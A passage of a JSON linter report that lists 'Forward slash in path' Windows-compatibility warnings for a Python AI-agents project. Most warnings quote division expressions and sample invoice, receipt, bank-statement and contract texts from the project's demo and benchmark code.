        "warning": "Line 752: Forward slash in path - \")\n        for symbol in self.symbols:\n            change = 0.0\n            if len(self.price_history[symbol]) >= 2:\n                change = ((self.price_history[symbol][-1] - self.price_history[symbol][-2]) \n                         / self.price_history[symbol][-2]) * 100\n            \n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.252108"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\trading_environment.py",
        "warning": "Line 770: Forward slash in path - ']}/{trading_agent.metrics['",
        "timestamp": "2025-09-05T17:30:42.252136"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\curriculum.py",
        "warning": "Line 282: Forward slash in path - ': min(1.0, self.episodes_in_stage / self.current_stage.min_episodes)\n            },\n            '",
        "timestamp": "2025-09-05T17:30:42.252860"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\curriculum.py",
        "warning": "Line 288: Forward slash in path - ': (self.current_stage_index + 1) / len(self.stages)\n            },\n            '",
        "timestamp": "2025-09-05T17:30:42.252877"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\curriculum.py",
        "warning": "Line 419: Forward slash in path - ': (self.current_stage_index / len(self.stages)) * 100,\n                '",
        "timestamp": "2025-09-05T17:30:42.252959"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 78: Forward slash in path - \"\n    \n    def __init__(self, log_dir: str, experiment_name: str):\n        self.log_dir = Path(log_dir)\n        self.experiment_name = experiment_name\n        self.log_file = self.log_dir / f\"",
        "timestamp": "2025-09-05T17:30:42.253441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 180: Forward slash in path - \"\n        report_path = self.log_dir / f\"",
        "timestamp": "2025-09-05T17:30:42.253520"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 554: Forward slash in path - ']\n        \n        # Normalize performance score\n        performance_score = total_reward / max(1, episode_length) + 0.5  # Add bias to keep positive\n        \n        # Update curriculum\n        stage_changed = self.curriculum_manager.update(performance_score)\n        \n        if stage_changed:\n            stage_info = self.curriculum_manager.get_progress_info()\n            self.logger.log_curriculum_change(self.current_episode, stage_info)\n    \n    async def _refresh_synthetic_data(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.253787"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 650: Forward slash in path - \"\n        checkpoint_dir = Path(self.config.output_dir) / \"",
        "timestamp": "2025-09-05T17:30:42.253854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 651: Forward slash in path - \"\n        checkpoint_dir.mkdir(parents=True, exist_ok=True)\n        \n        for agent_id, agent in self.agents.items():\n            checkpoint_path = checkpoint_dir / f\"",
        "timestamp": "2025-09-05T17:30:42.253873"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 655: Forward slash in path - \"\n            agent.save_checkpoint(str(checkpoint_path))\n        \n        # Save curriculum state if available\n        if self.curriculum_manager:\n            curriculum_path = checkpoint_dir / f\"",
        "timestamp": "2025-09-05T17:30:42.253893"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 666: Forward slash in path - \"\n        checkpoint_dir = Path(self.config.output_dir) / \"",
        "timestamp": "2025-09-05T17:30:42.253915"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 667: Forward slash in path - \"\n        checkpoint_dir.mkdir(parents=True, exist_ok=True)\n        \n        for agent_id, agent in self.agents.items():\n            checkpoint_path = checkpoint_dir / f\"",
        "timestamp": "2025-09-05T17:30:42.253935"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 696: Forward slash in path - '] / len(self.agents)\n        }\n        \n        # Add per-agent metrics\n        for agent_id, reward in results['",
        "timestamp": "2025-09-05T17:30:42.253968"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 711: Forward slash in path - \"\n        elapsed_time = time.time() - self.start_time\n        episodes_per_second = episode / elapsed_time if elapsed_time > 0 else 0\n        \n        # Calculate recent performance\n        recent_rewards = []\n        for agent_rewards in self.episode_rewards.values():\n            if len(agent_rewards) > 0:\n                recent_rewards.extend(list(agent_rewards)[-100:])  # Last 100 episodes\n        \n        recent_mean = np.mean(recent_rewards) if recent_rewards else 0.0\n        recent_std = np.std(recent_rewards) if recent_rewards else 0.0\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.254001"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 726: Forward slash in path - \"  Episodes/sec: {episodes_per_second:.2f}\"",
        "timestamp": "2025-09-05T17:30:42.254023"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 737: Forward slash in path - \")\n        \n        # Save final checkpoint\n        await self._save_checkpoint(self.current_episode)\n        \n        # Save training logs\n        self.logger.save_final_report()\n        \n        # Save curriculum completion report if available\n        if self.curriculum_manager:\n            curriculum_report = self.curriculum_manager.get_completion_report()\n            report_path = Path(self.config.output_dir) / f\"",
        "timestamp": "2025-09-05T17:30:42.254054"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 758: Forward slash in path - \"Training completed in {total_time/3600:.2f} hours\"",
        "timestamp": "2025-09-05T17:30:42.254081"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\training\\training_pipeline.py",
        "warning": "Line 767: Forward slash in path - ': (time.time() - self.start_time) / 3600,\n            '",
        "timestamp": "2025-09-05T17:30:42.254107"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 208: Forward slash in path - \"   📊 Success rate: {len(successful)}/{len(results)} ({len(successful)/len(results)*100:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.255458"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 237: Forward slash in path - \": total_time / len(results) if results else 0\n        }\n    \n    map_reduce_result = await coordinator.map_reduce(map_tasks, reduce_results, \"",
        "timestamp": "2025-09-05T17:30:42.255492"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 378: Forward slash in path - ']) / (len(results['",
        "timestamp": "2025-09-05T17:30:42.255585"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 379: Forward slash in path - ']) / execution_time if execution_time > 0 else 0\n    \n    print(f\"",
        "timestamp": "2025-09-05T17:30:42.255603"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 384: Forward slash in path - \"   • Planning efficiency: {len(tasks)/planning_time:.1f} tasks planned per second\"",
        "timestamp": "2025-09-05T17:30:42.255630"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 431: Forward slash in path - \": len(tasks)/planning_time\n        }\n    }\n    \n    with open(results_file, '",
        "timestamp": "2025-09-05T17:30:42.255695"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\experiments\\demos\\demo_meta_agents.py",
        "warning": "Line 467: Forward slash in path - ']:.2f} tasks/sec\"",
        "timestamp": "2025-09-05T17:30:42.255744"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "warning": "Line 42: Forward slash in path - \"\n        if context is None:\n            context = {}\\n        \\n        # Simulate processing time based on task complexity\\n        complexity = len(task_description) / 100.0\\n        processing_time = np.random.uniform(0.5, 2.0) * complexity\\n        await asyncio.sleep(processing_time)\\n        \\n        # Simulate performance based on specialization match\\n        task_lower = task_description.lower()\\n        performance_multiplier = 1.0\\n        \\n        if self.specialization == \\\"",
        "timestamp": "2025-09-05T17:30:42.256315"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "warning": "Line 44: Forward slash in path - \"] = (end_time - start_time).total_seconds() / 60.0\\n            \\n            logger.info(f\\\"",
        "timestamp": "2025-09-05T17:30:42.256781"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "warning": "Line 44: Forward slash in path - \"] = total_performance / performance_count\\n        \\n        summary[\\\"",
        "timestamp": "2025-09-05T17:30:42.256841"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "warning": "Line 44: Forward slash in path - \"] / max(1, summary[\\\"",
        "timestamp": "2025-09-05T17:30:42.256861"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "warning": "Line 44: Forward slash in path - \"] = sum(indicators.values()) / len(indicators)\\n        \\n        return indicators\\n\\n\\nasync def main():\\n    \\\"",
        "timestamp": "2025-09-05T17:30:42.256899"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\comprehensive_demo.py",
        "warning": "Line 44: Forward slash in path - ', 0)}/{perf.get('",
        "timestamp": "2025-09-05T17:30:42.256939"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 106: Forward slash in path - \"\n        start_time = time.time()\n        self.task_count += 1\n        \n        # Simulate processing with controlled variance\n        base_processing_time = 0.1  # 100ms base\n        complexity_multiplier = len(task_description) / 100.0\n        variance = np.random.uniform(1.0 - self.processing_variance, 1.0 + self.processing_variance)\n        \n        processing_time = base_processing_time * complexity_multiplier * variance\n        await asyncio.sleep(processing_time)\n        \n        end_time = time.time()\n        actual_processing_time = end_time - start_time\n        self.total_processing_time += actual_processing_time\n        \n        # Simulate occasional failures for realistic benchmarking\n        success = np.random.random() > 0.02  # 2% failure rate\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.257543"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 136: Forward slash in path - \"\n        avg_processing_time = (self.total_processing_time / max(1, self.task_count)) * 1000\n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.257565"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 155: Forward slash in path - \"\n        self.monitoring = True\n        self.cpu_readings.clear()\n        self.memory_readings.clear()\n        \n        while self.monitoring:\n            try:\n                cpu_percent = psutil.cpu_percent(interval=None)\n                memory_info = psutil.virtual_memory()\n                memory_mb = memory_info.used / 1024 / 1024\n                \n                self.cpu_readings.append(cpu_percent)\n                self.memory_readings.append(memory_mb)\n                \n                await asyncio.sleep(self.interval)\n            except Exception as e:\n                logger.warning(f\"",
        "timestamp": "2025-09-05T17:30:42.257590"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"] = memory_info.used / 1024 / 1024\\n            \\n            setup_duration = time.time() - setup_start\\n            setup_results[\\\"",
        "timestamp": "2025-09-05T17:30:42.257650"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \",\\n            start_time=start_time,\\n            end_time=end_time,\\n            duration_seconds=duration,\\n            throughput_tasks_per_second=len(test_tasks) / duration,\\n            average_response_time_ms=statistics.mean(response_times) if response_times else 0.0,\\n            p95_response_time_ms=np.percentile(response_times, 95) if response_times else 0.0,\\n            p99_response_time_ms=np.percentile(response_times, 99) if response_times else 0.0,\\n            success_rate=success_count / (success_count + error_count),\\n            error_rate=error_count / (success_count + error_count),\\n            accuracy_score=success_count / len(test_tasks),\\n            coordination_efficiency=0.85,  # Would calculate from actual coordination metrics\\n            agent_utilization=0.75,\\n            system_scalability_score=0.80,\\n            **resource_stats\\n        )\\n    \\n    async def benchmark_swarm_optimization(self) -> BenchmarkMetrics:\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.257708"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"] for r in optimization_results) / max(1, len(optimization_results))\\n        avg_response_time = np.mean([r[\\\"",
        "timestamp": "2025-09-05T17:30:42.257754"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \",\\n            start_time=start_time,\\n            end_time=end_time,\\n            duration_seconds=duration,\\n            throughput_tasks_per_second=len(optimization_results) / duration,\\n            average_response_time_ms=avg_response_time,\\n            p95_response_time_ms=avg_response_time * 1.2,  # Estimate\\n            p99_response_time_ms=avg_response_time * 1.5,  # Estimate\\n            success_rate=convergence_rate,\\n            error_rate=1.0 - convergence_rate,\\n            accuracy_score=avg_fitness,\\n            coordination_efficiency=avg_fitness,\\n            agent_utilization=0.80,\\n            system_scalability_score=0.75,\\n            emergent_behavior_score=avg_fitness * 0.9,  # Based on swarm behavior\\n            **resource_stats\\n        )\\n    \\n    async def benchmark_meta_learning(self) -> BenchmarkMetrics:\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.257781"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \",\\n            start_time=start_time,\\n            end_time=end_time,\\n            duration_seconds=duration,\\n            throughput_tasks_per_second=len(learning_results) / duration,\\n            average_response_time_ms=avg_learning_time,\\n            p95_response_time_ms=avg_learning_time * 1.3,\\n            p99_response_time_ms=avg_learning_time * 1.6,\\n            success_rate=len(learning_results) / len(learning_scenarios),\\n            error_rate=1.0 - (len(learning_results) / len(learning_scenarios)),\\n            accuracy_score=avg_performance,\\n            coordination_efficiency=avg_performance,\\n            agent_utilization=0.70,\\n            system_scalability_score=0.85,\\n            learning_acceleration=total_patterns / max(1, duration),  # Patterns per second\\n            **resource_stats\\n        )\\n    \\n    async def benchmark_integration_pipeline(self) -> BenchmarkMetrics:\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.257842"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \",\\n            start_time=start_time,\\n            end_time=end_time,\\n            duration_seconds=duration,\\n            throughput_tasks_per_second=len(test_tasks) / duration,\\n            average_response_time_ms=statistics.mean(response_times) if response_times else 0.0,\\n            p95_response_time_ms=np.percentile(response_times, 95) if response_times else 0.0,\\n            p99_response_time_ms=np.percentile(response_times, 99) if response_times else 0.0,\\n            success_rate=success_count / (success_count + error_count),\\n            error_rate=error_count / (success_count + error_count),\\n            accuracy_score=success_count / len(test_tasks),\\n            coordination_efficiency=0.88,\\n            agent_utilization=0.85,\\n            system_scalability_score=0.82,\\n            **resource_stats\\n        )\\n    \\n    async def benchmark_stress_test(self) -> BenchmarkMetrics:\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.257896"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \": len(successful_results) / len(batch)\\n                    })\\n                    \\n                except Exception as e:\\n                    logger.warning(f\\\"",
        "timestamp": "2025-09-05T17:30:42.257942"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"] for r in stress_results]) * 1000 if stress_results else 0.0\\n        overall_success_rate = total_successful / max(1, total_tasks)\\n        \\n        return BenchmarkMetrics(\\n            test_name=\\\"",
        "timestamp": "2025-09-05T17:30:42.257967"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \",\\n            start_time=start_time,\\n            end_time=end_time,\\n            duration_seconds=duration,\\n            throughput_tasks_per_second=total_tasks / duration,\\n            average_response_time_ms=avg_batch_time,\\n            p95_response_time_ms=avg_batch_time * 1.5,\\n            p99_response_time_ms=avg_batch_time * 2.0,\\n            success_rate=overall_success_rate,\\n            error_rate=1.0 - overall_success_rate,\\n            accuracy_score=overall_success_rate,\\n            coordination_efficiency=overall_success_rate * 0.9,\\n            agent_utilization=0.95,  # High under stress\\n            system_scalability_score=overall_success_rate,\\n            stability_score=1.0 - (resource_stats[\\\"",
        "timestamp": "2025-09-05T17:30:42.257994"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"] / 100.0),\\n            reliability_score=overall_success_rate,\\n            **resource_stats\\n        )\\n    \\n    async def run_comprehensive_benchmark(self) -> Dict[str, Any]:\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.258013"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"✅ {test_name} benchmark completed - Throughput: {result.throughput_tasks_per_second:.2f} tasks/sec\\\"",
        "timestamp": "2025-09-05T17:30:42.258067"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"] = performance_analysis\\n            \\n            # Pass/fail evaluation\\n            pass_fail_results = self._evaluate_pass_fail_criteria(benchmark_results)\\n            benchmark_session[\\\"",
        "timestamp": "2025-09-05T17:30:42.258093"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"] = (session_end - session_start).total_seconds() / 60.0\\n            \\n            logger.info(f\\\"",
        "timestamp": "2025-09-05T17:30:42.258118"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \"Evaluate pass/fail criteria against thresholds\\\"",
        "timestamp": "2025-09-05T17:30:42.258170"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - \")\\n        \\n        # Pass/Fail Results\\n        if \\\"",
        "timestamp": "2025-09-05T17:30:42.258262"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\advanced_coordination\\performance_benchmarks.py",
        "warning": "Line 172: Forward slash in path - ', 0):.2f} tasks/sec\\\"",
        "timestamp": "2025-09-05T17:30:42.258298"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 66: Forward slash in path - ', False))\n        success_rate = successful_results / len(self.results) if self.results else 0.0\n        avg_accuracy = statistics.mean(self.accuracy_scores) if self.accuracy_scores else 0.0\n        avg_cost_per_doc = self.total_cost / len(self.results) if self.results else 0.0\n        \n        return {\n            '",
        "timestamp": "2025-09-05T17:30:42.258843"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 77: Forward slash in path - ': self.total_time / len(self.results) if self.results else 0.0,\n            '",
        "timestamp": "2025-09-05T17:30:42.258858"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 84: Forward slash in path - ': ((6.15 - avg_cost_per_doc) / 6.15) * 100 if avg_cost_per_doc < 6.15 else 0.0\n            }\n        }\n\n\n# Sample documents for demonstration\nDEMO_DOCUMENTS = {\n    \"",
        "timestamp": "2025-09-05T17:30:42.258872"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 94: Forward slash in path - \"\n        TechConsult Pro Services\n        1234 Innovation Drive, Suite 567\n        San Francisco, CA 94105\n        (415) 555-0123\n        \n        INVOICE\n        \n        Invoice Number: TC-2024-001\n        Invoice Date: January 15, 2024\n        Due Date: February 14, 2024\n        \n        Bill To:\n        Startup Innovations Inc.\n        5678 Venture Blvd\n        Palo Alto, CA 94301\n        \n        Project: Cloud Migration Services\n        \n        Description                           Hours    Rate      Amount\n        Senior Cloud Architect                 40    $200/hr    $8,000.00\n        DevOps Engineer                        60    $150/hr    $9,000.00\n        Project Management                     20    $175/hr    $3,500.00\n        Documentation & Training               15    $125/hr    $1,875.00\n        \n        Subtotal:                                              $22,375.00\n        California State Tax (8.75%):                         $1,957.81\n        Total Amount Due:                                     $24,332.81\n        \n        Payment Terms: Net 30 days\n        Late Fee: 1.5% per month on overdue balance\n        \n        Thank you for your business!\n        \"",
        "timestamp": "2025-09-05T17:30:42.258895"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 184: Forward slash in path - \"\n        The Gourmet Table\n        456 Culinary Avenue\n        Seattle, WA 98101\n        (206) 555-0187\n        \n        Server: Maria G.\n        Table: 12\n        Guests: 4\n        \n        Receipt #: 2024-0112-0387\n        Date: 01/12/2024\n        Time: 7:45 PM\n        \n        ORDER DETAILS:\n        \n        2x Caesar Salad                    $18.00\n        1x Grilled Salmon                  $32.00  \n        1x Ribeye Steak                    $42.00\n        1x Vegetarian Pasta                $24.00\n        1x Chicken Marsala                 $28.00\n        \n        BEVERAGES:\n        2x House Wine (Glass)              $24.00\n        1x Craft Beer                      $8.00\n        1x Sparkling Water                 $4.00\n        \n        DESSERTS:\n        1x Tiramisu                        $9.00\n        1x Chocolate Cake                  $9.00\n        \n        Subtotal:                          $198.00\n        WA State Tax (10.1%):              $19.98\n        Gratuity (18%):                    $39.24\n        \n        TOTAL:                             $257.22\n        \n        Payment Method: VISA ending in 4532\n        Authorization Code: 789456\n        Approval Code: 123789\n        \n        Thank you for dining with us!\n        Visit us online: www.gourmettable.com\n        Follow @GourmetTableSeattle\n        \"",
        "timestamp": "2025-09-05T17:30:42.258952"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 234: Forward slash in path - \"\n        FIRST BUSINESS BANK\n        BUSINESS CHECKING ACCOUNT STATEMENT\n        \n        Account Holder: TechStart Solutions LLC\n        Account Number: ****7890\n        Statement Period: December 1, 2023 - December 31, 2023\n        \n        ACCOUNT SUMMARY\n        Beginning Balance (12/01/2023):          $45,267.89\n        Total Deposits:                          $127,450.00\n        Total Withdrawals:                       $89,234.67\n        Total Service Charges:                   $85.00\n        Ending Balance (12/31/2023):             $83,398.22\n        \n        DEPOSIT DETAIL\n        12/05  ACH Credit - Client Payment        $25,000.00\n        12/08  Wire Transfer - Investment         $50,000.00\n        12/12  Mobile Deposit - Check #1234       $8,750.00\n        12/18  ACH Credit - Recurring Revenue     $15,200.00\n        12/22  Cash Deposit                       $5,500.00\n        12/28  ACH Credit - Final Q4 Payment      $23,000.00\n        \n        WITHDRAWAL DETAIL\n        12/02  ACH Debit - Payroll                $32,500.00\n        12/03  Check #5001 - Office Rent          $4,200.00\n        12/05  Check #5002 - Utilities            $867.45\n        12/07  Online Transfer - Vendor Payment   $12,500.00\n        12/10  ACH Debit - Insurance Premium      $2,450.00\n        12/15  Check #5003 - Equipment Purchase   $8,900.00\n        12/16  ACH Debit - Payroll                $32,500.00\n        12/20  Online Payment - Credit Card       $3,456.78\n        12/23  Check #5004 - Marketing Services   $5,600.00\n        12/28  ATM Withdrawal                     $500.00\n        12/30  ACH Debit - Loan Payment          $2,760.44\n        \n        SERVICE CHARGES\n        12/15  Account Maintenance Fee            $25.00\n        12/20  Wire Transfer Fee                  $35.00\n        12/25  Overdraft Protection Fee           $25.00\n        \n        ACCOUNT ANALYSIS\n        Average Daily Balance:                   $64,832.50\n        Days Account Overdrawn:                  0\n        \n        Customer Service: 1-800-FIRST-BIZ\n        Online Banking: www.firstbusinessbank.com\n        \"",
        "timestamp": "2025-09-05T17:30:42.258985"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
        "warning": "Line 326: Forward slash in path - 's total liability shall not exceed the fees paid by Customer in \n        the twelve (12) months preceding the claim.\n        \n        6. TERMINATION\n        Either party may terminate this Agreement with sixty (60) days written notice.\n        Customer may terminate immediately for material breach not cured within \n        thirty (30) days.\n        \n        7. GOVERNING LAW\n        This Agreement shall be governed by the laws of the State of Texas.\n        \n        IN WITNESS WHEREOF, the parties have executed this Agreement as of the \n        Effective Date.\n        \n        CLOUDTECH SOLUTIONS INC.      GROWTH MARKETING CO.\n        \n        By: /s/ Jennifer Martinez       By: /s/ David Kim\n        Name: Jennifer Martinez        Name: David Kim  \n        Title: CEO                     Title: VP Operations\n        Date: January 10, 2024         Date: January 10, 2024\n        \n        Auto-renewal: Yes, for successive 12-month terms\n        Termination notice required: 60 days\n        \"",
        "timestamp": "2025-09-05T17:30:42.259038"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\multi_domain\\demo_system.py",
